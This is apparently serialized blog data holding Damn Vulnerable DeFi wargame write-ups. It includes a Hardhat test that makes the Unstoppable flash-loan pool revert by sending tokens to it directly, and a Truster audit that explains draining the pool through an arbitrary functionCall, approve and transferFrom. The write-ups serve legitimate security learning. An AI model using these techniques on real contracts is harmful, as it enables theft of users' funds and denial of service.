keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getSigners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">const</span> tokenFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'DamnValuableToken'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> UnstoppableLenderFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'UnstoppableLender'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> tokenFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> UnstoppableLenderFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token constant\">TOKENS_IN_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span><span class=\"token function\">depositTokens</span><span class=\"token punctuation\">(</span><span class=\"token constant\">TOKENS_IN_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token constant\">INITIAL_ATTACKER_TOKEN_BALANCE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">equal</span><span class=\"token punctuation\">(</span><span class=\"token constant\">TOKENS_IN_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">equal</span><span class=\"token punctuation\">(</span><span class=\"token constant\">INITIAL_ATTACKER_TOKEN_BALANCE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">const</span> ReceiverContractFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ReceiverUnstoppable'</span><span class=\"token punctuation\">,</span> someUser<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>receiverContract <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ReceiverContractFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>receiverContract<span class=\"token punctuation\">.</span><span class=\"token function\">executeFlashLoan</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exploit'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">await</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token constant\">INITIAL_ATTACKER_TOKEN_BALANCE</span>\n        <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">after</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">await</span> <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>receiverContract<span class=\"token punctuation\">.</span><span class=\"token function\">executeFlashLoan</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span>reverted<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>I think that the vulnerability is related to [SWC-132]Unexpected EtherBalance content in the Smart Contract Weakness Classification Registry.</p>\n<h2 id=\"next-time-\" style=\"position:relative;\"><a href=\"#next-time-\" aria-label=\"next time  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>next time.. 🚀</h2>\n<p>I will continue to post auditing and research on 12 challenge defi Smart Contracts.</p>\n<p>Thank you for the @tinchoabbate that made a good wargame.\n<a href=\"https://www.damnvulnerabledefi.xyz/\">Damn Vunlerable Defi</a></p>","frontmatter":{"date":"July 20, 2022","title":"Damn Vulnerable DeFi Wargame Challenge1 — Unstoppable Contract Analysis😎","categories":"Blockchain","author":"Zer0Luck","emoji":"🦊"},"fields":{"slug":"/defi-wargame-1/"}},"prev":{"id":"ee647e58-6973-5d73-8247-24dcc7057371","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAAChElEQVQoz1XRyU8TYQAF8G/2pQzTTjeYmc7MNzPtdCylFLpQaGmhFNuCUCvWBYFKBTVEIx5cYmJMjImSuMWLF28evOjBqFESoxe9YOKaGBON0YOJR/8BYxAvJu/6e4f3wJWD2xqDWV6w25xhzmVzLpt3RzwdMcEX9XT0CL6oyxt1ebsEX9TtjzndW8Kpyfnzt8aWzumjTaBJltdlYqSGkipKagihkKwhBhJ+qTcA+wMw3Sn3dcoJSU2pRkZUEtHkRP3Ihaljl+zp4wD5y3AaEoyO05BkdIKGBA1xWuOctqQmVSOjGhkFpvXgoKpn9GA2mp5MVZpmfg/AGJ3gIxhpAkLBHCGAKoBQAa4ARASoBDAZIBJKbLRTrEHQEEFEnIY4o7O8BexMrd46OVo+EEvX8rWlsfFWfnyhUG6Wtu7N5XcM5LaXyjOR7iJOQwA6aVpLxUdxWsUoyLQFgR6v1PetlKuLvQP1wlQrNzIzMrU4Up4L2XnNHJDUpBHKOj1dLBe0YKpaWf7y5rsKhwAqck4bSPZwpjqfHGpEExPWYEPWh9PZRjxZdQphgEgACyCoDIDoE5OfHjxZv/fu5dPfy0s3UUqjWBPwSkawSh610O5Ntuslj5TzmoWAOeQXY5TDIBidYAyM0hxC92xrdfXi4xtXX51eud0hpgERAIfmTp04enl6YkXSC267IsJhv1XUrCIvhBnOxCi4MQ8NSdbwy7lYz658tpnqawjuXgcTAz+fvf/14tuHu28Pz56VQ0XeE2e4MMOFSFYnmH9yM5sXco6E0r6723WmX7gO1u+sfX30+sfa5/vXHlp6HuAyTmsYpWH0fxKnIUZBlg9FAvt3ms8XrI81de0PkBR+gd3uy7UAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"truster-contract\"\n        title=\"truster-contract\"\n        src=\"/static/970dda92823702572cc1dd67ebf61200/37523/c3.png\"\n        srcset=\"/static/970dda92823702572cc1dd67ebf61200/e9ff0/c3.png 180w,\n/static/970dda92823702572cc1dd67ebf61200/f21e7/c3.png 360w,\n/static/970dda92823702572cc1dd67ebf61200/37523/c3.png 720w,\n/static/970dda92823702572cc1dd67ebf61200/e996b/c3.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>Wargame Provider: @tinchoabbate</strong></p>\n<blockquote>\n<p>Challenge #3 — Truster</p>\n</blockquote>\n<p>More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.\nCurrently the pool has 1 million DVT tokens in balance. And you have nothing.\nBut don’t worry, you might be able to take them all from the pool. In a single transaction.</p>\n<h2 id=\"code-audit\" style=\"position:relative;\"><a href=\"#code-audit\" aria-label=\"code audit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code Audit</h2>\n<blockquote>\n<p>TrusterLenderPool.sol</p>\n</blockquote>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 111.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAWCAIAAABPIytRAAAACXBIWXMAAAsTAAALEwEAmpwYAAADfUlEQVQ4y23Q227jRBzHcT8IFzTZxoexx/acPB57PD6MT0napIdNSXeBZSUkUMOK3iA17Rtwy1vwkmiSdlsQ0vfSH/3+Y+v+89+D+nVefhmKu1Ht5mq3UHfLcndW/3bZ/3413K/bL6tmtz500d5dtndX7W7d/LL78Kd12T1Ovom8qbAn3Dk25bMTZp8wcJr6s9SdJPYJcybMmVD3kDdl9rex5u+t6/7JdWQU9CHQEehCR0OnhnYVzKpgVgZ2GTpl7FaxWz7nlRhUkZ2P+Qfrenz0PYnCFoU1CprYq6PjF36JQYn9KnYVtIvIMcWuCbkqtMUgb62b8Smbqop1i6ZvMl2mWudtlequaHvVNlmbogoDFblF5D5j7KnQEWN+a93MnyJfMdxz1vF0YLRLkea8T3gv0o5HdRIqEqj4RSKvwMAsz+WttRn39jsewRaG2rwtaCK/Dk4LOCvgTIZ2cbz5qzTYU5Ej5oU5e++cpoj0xG8QqFGkTbBGYYVh9fVU9CoLAgxeGDzfu1POYcfdhqAO4ZbQlrKOohbD6u3gUWJQEF/FR/zdYg8mPA37hPQ0HQhtGeu5nHPeU9ISWMeu/JcEBfVV7Iql2lrbxd47TWOoQ7+MzZQKbRk5pjePfJVHjFyxLLfW7fLRnSaUdEk+JnKe5CMOyv9eC14l8QsWGHxWbq2P54/OCaW4Y9nIRE+Rjp3/e+fzpumIzyuDH8A0oZEmWBOi07BhXhm/YfhlkL6UBAp7B/z9+d6bMg51gXsEVGTL2JWxI5EjkSvxS8STBEgCChYUCTR4VW2tH1YP/mlCY81En7CWEk3DisU1Iw0jTYLqBNcpbThp8rgRUUUPmHhiVW+tH9d7b0pJ1HDeczGkcuBEp6zN1DwVveRNletatkroJtWKahYUHCoCxLreWp8u9mBCGdIJ7xLWMqpT2grSJqhmUWVmmU5gSYGkvmS+TGDBQ0WBuKi31k8Xe/CO0qg2EjeMNjnSIqpJoBhUFCoGS1Ng/lMSKOZLDg2+bLbW58t98C5JcJvlY1aMQg6C6FyOsl5k+aDyrir6phzqoh9Eby4ndRZXLMiu2lvr0/oPb4oRkLGfo8CEQYb8DMMcBxn1BfNFEhwKBYeChxnzs8ihZ+raevj5r1Zcj/nNkG2GbDPmm7k0LeRmUZiWxWapNmeHztVmVW7W1c2qen//8eEfmpsxmr7aVX4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"TrusterLenderPool\"\n        title=\"TrusterLenderPool\"\n        src=\"/static/a8521907c24e386de6e9b90d41a84094/37523/c3-1.png\"\n        srcset=\"/static/a8521907c24e386de6e9b90d41a84094/e9ff0/c3-1.png 180w,\n/static/a8521907c24e386de6e9b90d41a84094/f21e7/c3-1.png 360w,\n/static/a8521907c24e386de6e9b90d41a84094/37523/c3-1.png 720w,\n/static/a8521907c24e386de6e9b90d41a84094/e996b/c3-1.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"dependency\" style=\"position:relative;\"><a href=\"#dependency\" aria-label=\"dependency permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Dependency</h3>\n<ul>\n<li>We are using the Address contract of the openzeppelin library as a dependency.</li>\n</ul>\n<h3 id=\"state-variable\" style=\"position:relative;\"><a href=\"#state-variable\" aria-label=\"state variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Variable</h3>\n<p><code class=\"language-text\">IERC20 public immutable damnValuableToken</code></p>\n<ul>\n<li>IERC20 standard damnValuableToken used globally in this challenge is used for contract address management.</li>\n</ul>\n<h3 id=\"functions\" style=\"position:relative;\"><a href=\"#functions\" aria-label=\"functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h3>\n<p><code class=\"language-text\">constructor(address tokenAddress)</code></p>\n<ul>\n<li>It has the token contract initialization process and instance allocation criteria.</li>\n</ul>\n<p><code class=\"language-text\">function flashLoan(uint256 borrowAmount, address borrower, address target, byte calldata data) external nonReentrant</code></p>\n<ul>\n<li>\n<p>This is the part responsible for the main logic of this contract. Let’s analyze the logic.</p>\n</li>\n<li>\n<p>The local variable <code class=\"language-text\">balanceBefore</code> receives the balance information of this contract by using the balance method of the <code class=\"language-text\">damnValuableToken</code> contract.</p>\n</li>\n</ul>\n<p>✅ The <code class=\"language-text\">balanceBefore</code> value must be greater than or equal to the <code class=\"language-text\">borrowAmount</code> value, and it must be greater than the value you want to borrow from the entire pool.</p>\n<ul>\n<li>Using the <code class=\"language-text\">transfer</code> method of the <code class=\"language-text\">dammValuableToken</code> contract, the parameter <code class=\"language-text\">borrower</code> is transferred as much as the <code class=\"language-text\">borroAmount</code> value.</li>\n<li>If the first condition is passed, you can ask for a quote that unconditionally transfer is possible.</li>\n<li>You can proceed with <code class=\"language-text\">functionCall</code> based on the parameter <code class=\"language-text\">target</code> address value and call it by passing <code class=\"language-text\">bytes calldata data</code> value as a parameter.</li>\n<li>After that, the logic proceeds to finalize the flash loan logic.</li>\n</ul>\n<h2 id=\"vulnerability\" style=\"position:relative;\"><a href=\"#vulnerability\" aria-label=\"vulnerability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability</h2>\n<p>The vulnerability in this contract is that external users can construct and call any function they want. If an attacker steals the balance information of the target contract, or the attack vector that can perform a service-level attack such as DOS is universal, it is a very serious condition.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 64.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAACdUlEQVQoz03Q2W7TQBSAYT8IolEbJ97j8awexzPe4jjO0qZxm7R1U0GFKFsvQNxAI1VcIBLKNa/AY/BoyEVISN/VkX6do6Pc3/6+OPx2NX9Yz3dX892z493zxe56sXtx8v3l6sfN6uFmubtZbl+ttq/Ptm/Ot+8utrf17u351+37X8py/OXgiaO1WHsPd1q4/RSqe0htIW2fOFpga77RJt0W1PYb+j7UD6DZRp09pwzPlOXo3lWFjyc4mNJwBr1hT0tcPXH12NUioEfAiDwzhmaMzBhZDWInnhEeJlfKaXHX7XKWHuFgTMQEOKnTlU5X9jThPgJ6wzMa0BDQFMiSQOOzqFaW5UZXOXBz4A4AyICTONq/Um808f+lKbAlgc4P41pZjTea6kNUuHbiqMLpiqbsPu7UhKeHnhHChvD+lqYgtvR0fhTXyvlkY3Q4ZiVEObBi15CuIYEpgSE9SzYTM4ZWhBxJrAjbEluPscGP0lq5mG4MlRFWkqCkckz7I+ZlLBz5svR5HvhF0J9EchSFec6GAg+wKagjocHnaa3U043eZgjmEKTIS7xeCno5BimGKe7FDCUcJdSWxBLEEdQRxG5iZPDjrFYuZ3dGh1FWADh0UQlRSViJ7RhZEtkRdmPixqj5VojMsLnZEsyRyOSLrFbWhxtTpcwfUb+gfETxwEeZHxQ+H/osp6SgbCz6Q+kPMpwLlAQg4m6EreAkv1TWs0+6iiBMEUoQTpAbYUdikhCaYCA5lBxFIZF9JEQjDJEgdt/TyTxdKR+vf8Z0kdGTjFYZrQasGvAq96uhXxW8MQoWo6Aq+1UZVuOwmohqFp1OZfVh/fkPOC6+/EStYiIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"flashLoan function\"\n        title=\"flashLoan function\"\n        src=\"/static/f8021872b9d411d8a4b027c58516695d/37523/c3-2.png\"\n        srcset=\"/static/f8021872b9d411d8a4b027c58516695d/e9ff0/c3-2.png 180w,\n/static/f8021872b9d411d8a4b027c58516695d/f21e7/c3-2.png 360w,\n/static/f8021872b9d411d8a4b027c58516695d/37523/c3-2.png 720w,\n/static/f8021872b9d411d8a4b027c58516695d/e996b/c3-2.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>When executing the <code class=\"language-text\">target.functionCall(data)</code> line in the current code and manipulating each parameter to a desired value, it is possible to call a specific function and function parameter. However, since the before and after remnants must be the same, it is impossible to abuse the function in the form of stealing the balance value singly.</p>\n<h2 id=\"solve\" style=\"position:relative;\"><a href=\"#solve\" aria-label=\"solve permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>solve</h2>\n<p>An attacker constructs a desired payload and calls functionCall inside the vulnerable <code class=\"language-text\">flashLoan</code> function to steal the balance value of the corresponding token pool. When transferring tokens forcibly, the destination address must be accepted before <code class=\"language-text\">transfer</code> because security is set in the ERC20 <code class=\"language-text\">Approve/Allow</code>Flow method. But this part is easy to fix. By calling <code class=\"language-text\">approve(address, amount)</code> using functionCall, after allowing the amount to be stolen and the address value to be taken, all funds in the pool are stolen by calling the trasferFrom function.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 166.1111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAhCAIAAABWXBxEAAAACXBIWXMAAAsTAAALEwEAmpwYAAAEwElEQVQ4y23S2Y7jNhaAYT1Jkja6bG0kxZ0SLVISSS122bXYnSAzWRAEAwwQdKWD2EHeYG7mOeY5B7KrekuAH777cI6PGD39+L/R/rK1v07m7ca83di52/Zp1zzd+XcP/W/79u3ePd25p3s/9+CfHv2v9+6Xf339n+iuO2dfsiQ1yY1O0nWeaZxVq4V6/QVfvpKrOTG3EPG1VyJZyJuviCb76BD+lMCL9V7JjRBTVW0aOWrSMxjgqoOrFq1aFD9XxG2RtDhp4aru5JvoLpyzpBZ84sQLFgh0xaphSUfSDtzY/MaClYWX0Mqi2KLYFLGFS92KY3TnT+mXJckDKDxEHmYdBC7LfApGCIYStwy0n0qDr1geo3t/ipeaF6NMg8w8yz3O3Lxt0s0bpvOeF2muci6xcKU7eYwewnn5lVRkW9GtpluFJ5kGXgRCJkR2vJhw0sCVgbFBqyuucWLQFT+G8+qV4oknKGAccOFp5njmisIDNEE4ADTwwlWkKXErUaPZWJEBLq+4P68WiseO5K7AvsCepC1POowcROMcnljhStxo2qqiWbNJ0xGutFPH6NCf44XCcQdSV8QtzRyDgcNAgUfA47R5+Z8GpwYnBieWZraIL/g4nONXUmU9JLdV6g3ZuPoQ6kep9oTvJAwADQhPNG9xUl+woemMfXnFCyVSx+MWgD4HPc49Tdsc9QgETQcjt2s+XRlJr804lMfozXiOF5LhXsJA4hblHkJPgKNZh6DH0JHEfCrnyTjWobrgZCEJCARvjNyty32l9iTrcNIg4DBwf5GGZbZILvjr62QSBHIkbYq8Q3lHoJPIYdDhrCWfSpoZmluc6H7G0ym/KQkMDG9KHBBwAHpa9GXhMZyf+ucymyeTK/5mOoFVJVCHE8Niy2MjUkvjulhqvFqTpH5mH6Th2WWyPkbfbE7ZaymJ40UrC68KJ3CPi6GAniFHP595Kbck1aM+Rt9uT9lCEOSx3LXal9yhvMNovjOFHf0baTiwNNWDPsw4fS1JYhHblWxYk4ZmZt720lWyj2VuxPPkQ/SP23ltmlpa9JSOrWo5tJdn9DyQfiovzZOn9SH65xUnFqPASG95w3KD45qmNc3q95J/kEYCS7OPsMS+VlspJsmCEUMtRk0DQa4knmU1y2r+8ivy+oo3M96dstei5mNV7lT9UOpd6O57/yjVLSdjxSbOJsYGJYKmXqJ2/ijQskxv6kP0w/1Z4a5Xt5pORO2Z2JZsaOTESE/JoEhQpKd8Enxo5FDyntFeXbE5RN/tTyRfK+Su745lNb3c+f2qLKvFZVueX3bO6xnnemsO0fe732FSahrWoKuh0zhw0Hx0WCNyI8CcfElBy3N9aw7Rj/sTWEqFXFl4BV2JOgmseLnq5xLOlR/w3QksRUnDmgQFO0GCIKFkg2FBsV5gJ0D9XqpLV7yzFwyXohJDJTdduW3qu/V6r2gw1AvqBXafyRkjK8AF/3R/hktZ8bGWW8t6SQfOxor2VeE4GxUbFLQK2